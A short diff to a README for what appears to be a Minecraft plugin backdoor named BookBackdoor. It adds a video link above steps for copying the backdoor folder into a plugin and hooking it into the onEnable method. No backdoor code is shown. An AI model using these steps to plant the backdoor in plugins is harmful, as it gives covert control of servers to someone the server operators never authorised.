@@ -12,6 +12,9 @@
 </p>
 
 # How-to
+
+* Youtube link: https://youtu.be/r60HdxPhwy0
+<br>
 * 1: Copy the folder ```src/main/java/org/brandonplank/backdoor``` into your plugin
 * 2: Import BookBackdoor.java into your main class
 * 3: Add this code to the ```onEnable(){}``` method in your main class
